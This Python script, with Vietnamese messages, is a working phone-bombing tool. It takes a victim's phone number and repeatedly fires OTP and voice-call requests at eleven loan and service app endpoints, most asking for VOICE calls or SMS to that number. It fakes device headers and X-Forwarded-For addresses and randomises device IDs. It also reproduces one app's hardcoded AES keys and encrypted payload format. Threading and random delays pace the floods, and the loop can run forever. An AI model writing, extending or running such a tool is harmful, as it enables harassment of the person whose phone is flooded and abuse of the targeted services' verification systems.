import sys
import time
import concurrent.futures
import requests
import json
import base64
import re
import urllib3
import random
import hashlib
import uuid
import zlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from collections import OrderedDict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
GREEN = '\033[92m'
RESET = '\033[0m'

def random_headers():
    devices = [
        "SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "SM-M526B",
        "Xiaomi 13 Pro", "Xiaomi 14 Ultra", "Redmi Note 13 Pro", "Redmi K70", "POCO X6 Pro",
        "Nubia Neo 5G", "Nubia Z60 Ultra", "Nubia Red Magic 9 Pro",
        "OPPO Find X7 Ultra", "OPPO Reno 11 Pro", "OPPO A78",
        "vivo X100 Pro", "iQOO 12 Pro", "iQOO Neo 9 Pro",
        "iPhone15,2", "iPhone15,3", "iPhone16,1", "iPhone16,2",
        "Pixel 8 Pro", "Pixel 7a", "M2012K11AG", "V2134", "CPH2211"
    ]
    android_versions = ["11", "12", "13", "14", "15"]

    device = random.choice(devices)
    return {
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {device})",
        "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Language": random.choice(["vi-VN", "en-US"]),
        "Accept-Encoding": "gzip"
    }

def call1(phone):
    def fix_b64(s):
        s = re.sub(r'[^a-zA-Z0-9+/=]', '', s)
        missing_padding = len(s) % 4
        if missing_padding:
            s += '=' * (4 - missing_padding)
        return s

    def decrypt(data_b64, key, iv):
        try:
            raw = base64.b64decode(fix_b64(data_b64))
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(raw)
            try:
                return unpad(decrypted, 16).decode('utf-8')
            except:
                return decrypted.decode('utf-8', errors='ignore').strip()
        except Exception as e:
            return f"Lỗi giải mã: {e}"

    def encrypt(data_dict, key, iv):
        js_str = json.dumps(data_dict, separators=(',', ':')).encode('utf-8')
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct_bytes = cipher.encrypt(pad(js_str, 16))
        return base64.b64encode(ct_bytes).decode('utf-8')

    url = "https://keepch.catsoutofbags.com/userlogin/transmit/user-text"
    headers = {
        "Host": "keepch.catsoutofbags.com",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "okhttp/4.12.0",
        "nqab": "mMxsEAnmSHyMXWsP",
        "groawfq": "qdowvh"
    }
    headers.update(random_headers())
    key = b"QALMuZOyJUkyzoVw"
    iv = b"nNCUynBrwFMqgTUC"
    payload = {
        "brhawjd": {
            "rvdw": "mMxsEAnmSHyMXWsP",
            "zbwpc": "android",
            "hzdajc": "1.25.21",
            "vfnmdgb": 10,
            "pjz": "com.hours.money",
            "otvlqiwf": "app",
            "wgdqu": "1697bf584f3e23536b27c31b5cb893b3",
            "xntfmn": "",
            "ydu": {
                "vjq": "samsung",
                "nnv": "9",
                "rdwiqbvt": "28",
                "yljv": "SM-S9280",
                "qesoj": "f3b8959d4cc4ed14",
                "vjpot": "5aef5e0f-43dc-427d-b0e8-f1cb4ada62e6"
            },
            "kmpnybt": 1,
            "hpiptgew": 1,
            "gdbxdcj": 1,
            "uhucyq": 1
        },
        "twh": {
            "azznw": "VOICE",
            "kgzekcyl": phone
        }
    }
    service_data = encrypt(payload, key, iv)
    try:
        res = requests.post(url, json={"serviceData": service_data}, headers=headers, verify=False, timeout=15)
        cookies = res.headers.get('Set-Cookie', '')
        print(f"[call1] Cookies: {cookies}")
        if res.status_code == 200:
            resp_json = res.json()
            enc_res = resp_json.get("serviceData", "")
            decrypted = decrypt(enc_res, key, iv)
            print(f"[call1] ✓ {decrypted}")
        else:
            print(f"[call1] ✗ HTTP {res.status_code}")
            print(f"[call1] Response: {res.text}")
    except Exception as e:
        print(f"[call1] ✗ {str(e)}")

def call2(phone):
    def aes_gcm_encrypt(data, key, iv):
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        if isinstance(data, str):
            data = data.encode('utf-8')
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(iv + ciphertext + tag).decode('utf-8')

    def generate_token(android_id, key, iv):
        step1 = aes_gcm_encrypt(f"{android_id}++1", key, iv)
        timestamp = str(int(time.time() * 1000))
        return aes_gcm_encrypt(f"{step1}+{timestamp}", key, iv)

    def format_phone(p):
        clean_phone = p.strip()
        if clean_phone.startswith("0"):
            clean_phone = clean_phone[1:]
        return f"840{clean_phone}"

    android_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
    key = b"uK7w2ythmjfse43L"
    iv = b"\x00"*12
    app_type = "1042"
    version = "1.2.1"
    country = "vn"
    base_url = "https://vangvay.com/biz-api/"
    send_path = "fejgk/abma/mibda"
    formatted_phone = format_phone(phone)
    params = OrderedDict()
    params["fakjok"] = app_type
    params["fpnojg"] = country
    params["fpdile"] = formatted_phone
    params["fdpaai"] = 2
    params["fafmml"] = 1
    params["fjmgcp"] = version
    json_params = json.dumps(params, separators=(',', ':'))
    enc_param = aes_gcm_encrypt(json_params, key, iv)
    enc_url = aes_gcm_encrypt(send_path, key, iv)
    wrapper = OrderedDict()
    wrapper["param"] = enc_param
    wrapper["url"] = enc_url
    json_wrapper = json.dumps(wrapper, separators=(',', ':'))
    final_payload = aes_gcm_encrypt(json_wrapper, key, iv)
    headers = {
        "Accept": "application/json",
        "appType": app_type,
        "countryCode": country,
        "token": generate_token(android_id, key, iv),
        "type": app_type,
        "User-Agent": "okhttp/5.1.0",
        "version": version,
        "Content-Type": "application/json; charset=UTF-8",
        "Connection": "Keep-Alive"
    }
    headers.update(random_headers())
    try:
        response = requests.post(base_url + send_path, data=final_payload, headers=headers, timeout=15)
        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call2] Cookies: {cookies}")
        if response.status_code == 200:
            print(f"[call2] ✓ {response.text}")
        else:
            print(f"[call2] ✗ HTTP {response.status_code}")
            print(f"[call2] Response: {response.text}")
    except Exception as e:
        print(f"[call2] ✗ {str(e)}")

def call3(phone):
    url = "https://vaycash.vip/api/scone-app/register/otp"
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip",
        "Access-Token": "",
        "App-Id": "A46282",
        "App-Version": "1.0.1",
        "Content-Type": "text/plain; charset=utf-8",
        "Country": "Vietnam",
        "Host": "vaycash.vip",
        "Language": "vi_VN",
        "User-Agent": "Android",
        "Connection": "keep-alive"
    }
    headers.update(random_headers())
    params = {
        "phone": phone,
        "type": "LOGIN_OR_REGISTER",
        "sendType": "VOICE"
    }
    try:
        response = requests.get(url, params=params, headers=headers, timeout=15)
        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call3] Cookies: {cookies}")
        if response.status_code == 200:
            print(f"[call3] ✓ {response.text}")
        else:
            print(f"[call3] ✗ HTTP {response.status_code}")
            print(f"[call3] Response: {response.text}")
    except Exception as e:
        print(f"[call3] ✗ {str(e)}")

def call4(phone):
    url = "https://tienons.com/api/scone-app/register/otp"
    params = {
        "phone": phone,
        "type": "LOGIN_OR_REGISTER",
        "sendType": "VOICE"
    }
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip",
        "Access-Token": "",
        "App-Id": "A79500",
        "App-Version": "1.0.2",
        "Content-Type": "text/plain; charset=utf-8",
        "Country": "Vietnam",
        "Host": "tienons.com",
        "Language": "vi_VN",
        "User-Agent": "Android"
    }
    headers.update(random_headers())
    try:
        response = requests.get(url, params=params, headers=headers, timeout=15)
        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call4] Cookies: {cookies}")
        if response.status_code == 200:
            print(f"[call4] ✓ {response.text}")
        else:
            print(f"[call4] ✗ HTTP {response.status_code}")
            print(f"[call4] Response: {response.text}")
    except Exception as e:
        print(f"[call4] ✗ {str(e)}")

def call5(phone):
    url = "https://79dong.com/api/scone-app/register/otp"
    params = {
        "phone": phone,
        "sendType": "VOICE",
        "type": "LOGIN_OR_REGISTER"
    }
    headers = {
        "Accept-Encoding": "gzip",
        "App-ID": "A89873",
        "App-Version": "1.0.5",
        "Connection": "Keep-Alive",
        "Host": "79dong.com",
        "Language": "vi_VN",
        "User-Agent": "android"
    }
    headers.update(random_headers())
    try:
        response = requests.get(url, params=params, headers=headers, timeout=15)
        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call5] Cookies: {cookies}")
        if response.status_code == 200:
            print(f"[call5] ✓ {response.text}")
        else:
            print(f"[call5] ✗ HTTP {response.status_code}")
            print(f"[call5] Response: {response.text}")
    except Exception as e:
        print(f"[call5] ✗ {str(e)}")

def call6(phone):
    url = "https://vay360.xyz/api/scone-app/register/otp"
    params = {
        "phone": phone,
        "sendType": "VOICE",
        "type": "LOGIN_OR_REGISTER"
    }
    headers = {
        "Accept-Encoding": "gzip",
        "App-ID": "A34073",
        "App-Version": "1.0.5",
        "Connection": "Keep-Alive",
        "Host": "vay360.xyz",
        "Language": "vi_VN",
        "User-Agent": "android"
    }
    headers.update(random_headers())
    try:
        response = requests.get(url, params=params, headers=headers, timeout=15)
        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call6] Cookies: {cookies}")
        if response.status_code == 200:
            print(f"[call6] ✓ {response.text}")
        else:
            print(f"[call6] ✗ HTTP {response.status_code}")
            print(f"[call6] Response: {response.text}")
    except Exception as e:
        print(f"[call6] ✗ {str(e)}")

def call7(phone):
    url = "https://3dl88.com/dl/api/user/appCollectUpload"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "3dl88.com",
        "language": "vi_VN",
        "osVersion": "2.1.0",
        "User-Agent": "okhttp/5.1.0"
    }
    headers.update(random_headers())
    json_data = {
        "5a7b21f8-4_appVersion": "2.1.0",
        "7dbb75cc-a_phone": phone,
        "acd6c0b3-f_type": "2",
        "2b23ce4b-9_detailed_type": "10",
        "ca6915e9-6_productName": "dong_888"
    }
    try:
        response = requests.post(url, headers=headers, json=json_data, timeout=15)
        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call7] Cookies: {cookies}")
        if response.status_code == 200:
            print(f"[call7] ✓ {response.text}")
        else:
            print(f"[call7] ✗ HTTP {response.status_code}")
            print(f"[call7] Response: {response.text}")
    except Exception as e:
        print(f"[call7] ✗ {str(e)}")

def call8(phone):
    url = "https://spj.daukhimiennam.com/api/customer/generateOTP"
    boundary = str(uuid.uuid4())

    headers = {
        "accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip",
        "baggage": f"sentry-environment=production,sentry-public_key=8c9a0cda91a6818800ae75ebc521418f,sentry-release=gas.dung.com.gas24h%4025.6.18%2B250618,sentry-sample_rand={random.random()},sentry-trace_id={hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}",
        "Connection": "Keep-Alive",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Host": "spj.daukhimiennam.com",
        "sentry-trace": f"{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}-{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}",
        "User-Agent": "okhttp/4.11.0"
    }
    headers.update(random_headers())

    devices_list = ["SM-S9280", "SM-G998B", "Xiaomi 13 Pro", "Redmi Note 13", "iPhone15,2"]
    imei_list = ["f3b8959d4cc4ed14", hashlib.md5(str(random.random()).encode()).hexdigest()[:16], hashlib.md5(str(random.random()).encode()).hexdigest()[:16]]
    gcm_tokens = [
        "c582cvjrTEumSiUoKaiLpi:APA91bGeYujudeqmrHGygFqbrP8TVPnZKXhoKQR9-p0assxL_82GOZO-RuLt6nh17iSukLgPeDWoYdWAeMYsV-jWVKFN761NvmTJTgwWNRZGgmmdZSGghlU",
        f"f{random.randint(1000000,9999999)}:APA91b{hashlib.md5(str(random.random()).encode()).hexdigest()[:20]}",
        f"c{random.randint(1000000,9999999)}:APA91b{hashlib.md5(str(random.random()).encode()).hexdigest()[:20]}"
    ]

    json_data = {
        "app_type": 3,
        "version_code": "250618",
        "platform": 1,
        "token": "",
        "acc": "",
        "device_imei": random.choice(imei_list),
        "app_customer_type": "",
        "role_id": "",
        "soft_version": 1,
        "phone": phone,
        "gcm_device_token": random.choice(gcm_tokens),
        "device_name": random.choice(devices_list),
        "device_os_version": str(random.randint(9, 15))
    }

    body = f"--{boundary}\r\n"
    body += "content-disposition: form-data; name=\"q\"\r\n"
    body += f"Content-Length: {len(json.dumps(json_data))}\r\n\r\n"
    body += json.dumps(json_data) + "\r\n"
    body += f"--{boundary}--\r\n"

    try:
        response = requests.post(url, headers=headers, data=body, timeout=15)
        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call8] Cookies: {cookies}")
        if response.status_code == 200:
            print(f"[call8] ✓ {response.text}")
        else:
            print(f"[call8] ✗ HTTP {response.status_code}")
            print(f"[call8] Response: {response.text}")
    except Exception as e:
        print(f"[call8] ✗ {str(e)}")

def call9(phone):
    url1 = "https://vttl.org/vtl/api/user/appCollectUpload"
    url2 = "https://vttl.org/vtl/api/user/sentSms"

    session = requests.Session()

    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "vttl.org",
        "language": "vi_VN",
        "osVersion": "2.3.0",
        "User-Agent": "okhttp/4.12.0"
    }
    headers.update(random_headers())

    body1 = {
        "72677_appVersion": "2.3.0",
        "e7297_phone": phone,
        "5b4fa_type": "2",
        "40e23_detailed_type": "10",
        "fa4c2_productName": "vtl_trung_m"
    }

    body2 = {
        "277f4_phone": phone,
        "e7755_smsType": 1,
        "b3f6c_type": "1",
        "5d250_loanProductName": "vtl_trung_m"
    }

    try:
        response1 = session.post(url1, headers=headers, json=body1, timeout=15)
        cookies1 = response1.headers.get('Set-Cookie', '')
        print(f"[call9][appCollectUpload] Cookies: {cookies1}")
        if response1.status_code == 200:
            print(f"[call9][appCollectUpload] ✓ {response1.text}")
        else:
            print(f"[call9][appCollectUpload] ✗ HTTP {response1.status_code}")
            print(f"[call9][appCollectUpload] Response: {response1.text}")

        response2 = session.post(url2, headers=headers, json=body2, timeout=15)
        cookies2 = response2.headers.get('Set-Cookie', '')
        print(f"[call9][sentSms] Cookies: {cookies2}")
        if response2.status_code == 200:
            print(f"[call9][sentSms] ✓ {response2.text}")
        else:
            print(f"[call9][sentSms] ✗ HTTP {response2.status_code}")
            print(f"[call9][sentSms] Response: {response2.text}")

    except Exception as e:
        print(f"[call9] ✗ {str(e)}")

def call10(phone):
    url = "https://vaypay88.com/api/scone-app/register/otp"

    params = {
        "phone": phone,
        "type": "LOGIN_OR_REGISTER",
        "sendType": "VOICE"
    }

    headers = {
        "Accept-Language": "vi",
        "User-Agent": "android",
        "App-Version": "2.1.2",
        "App-ID": "A18566",
        "Access-Token": "",
        "Country": "Vietnam",
        "Language": "vi_VN",
        "Host": "vaypay88.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    headers.update(random_headers())

    try:
        response = requests.get(url, params=params, headers=headers, timeout=15)
        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call10] Cookies: {cookies}")
        if response.status_code == 200:
            print(f"[call10] ✓ {response.text}")
        else:
            print(f"[call10] ✗ HTTP {response.status_code}")
            print(f"[call10] Response: {response.text}")
    except Exception as e:
        print(f"[call10] ✗ {str(e)}")

def call11(phone):
    url = "https://api.vaynflash.com/api/user/app/login/sms"

    timestamp = str(int(time.time() * 1000))

    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "api.vaynflash.com",
        "lang": "vi_VN",
        "User-Agent": "Android"
    }
    headers.update(random_headers())

    json_data = {
        "appCode": "vayflash",
        "mobileType": "2",
        "phone": phone,
        "version": "1.0.4"
    }

    json_str = json.dumps(json_data, separators=(',', ':'))

    sign_str = json_str + timestamp
    sign = hashlib.md5(sign_str.encode()).hexdigest()

    headers["sign"] = sign
    headers["timestamp"] = timestamp

    try:
        response = requests.post(url, headers=headers, json=json_data, timeout=15)

        cookies = response.headers.get('Set-Cookie', '')
        print(f"[call11] Cookies: {cookies}")

        if response.status_code == 200:
            try:
                if response.headers.get('content-encoding') == 'gzip':
                    decompressed = zlib.decompress(response.content, 16 + zlib.MAX_WBITS)
                    print(f"[call11] ✓ {decompressed.decode('utf-8')}")
                else:
                    print(f"[call11] ✓ {response.text}")
            except:
                print(f"[call11] ✓ {response.text}")
        else:
            print(f"[call11] ✗ HTTP {response.status_code}")
            print(f"[call11] Response: {response.text}")
    except Exception as e:
        print(f"[call11] ✗ {str(e)}")

functions = [call1, call2, call3, call4, call5, call6, call7, call8, call9, call10, call11]
def run(phone):
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        futures = []
        for fn in functions:
            future = executor.submit(fn, phone)
            futures.append(future)
            time.sleep(random.uniform(0.4, 1.2))  # delay nhỏ ngẫu nhiên giữa việc submit từng request

        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except:
                pass

    time.sleep(random.uniform(4, 7))  

if __name__ == "__main__":
 if len(sys.argv) != 3:
    print("❌ Dùng: python call.py <sdt> <so_lan>")
    sys.exit(1)

phone = sys.argv[1].strip()
if not phone:
    print("Thiếu số điện thoại!")
    sys.exit(1)

try:
    count = int(sys.argv[2])
except ValueError:
    print("Số lần phải là số!")
    sys.exit(1)

# ===== CHẠY =====
if count > 0:
    for i in range(1, count + 1):
        print(f"{GREEN}Bắt đầu vòng {i}/{count}{RESET}")
        run(phone)   # run() gọi 8 API bên trong
        print(f"{GREEN}Hoàn thành vòng {i}{RESET}")

        if i < count:
            time.sleep(random.uniform(8, 15))
else:
    i = 1
    while True:
        print(f"{GREEN}Bắt đầu vòng {i} (vô hạn){RESET}")
        run(phone)
        print(f"{GREEN}Hoàn thành vòng {i}{RESET}")
        time.sleep(random.uniform(8, 15))
        i += 1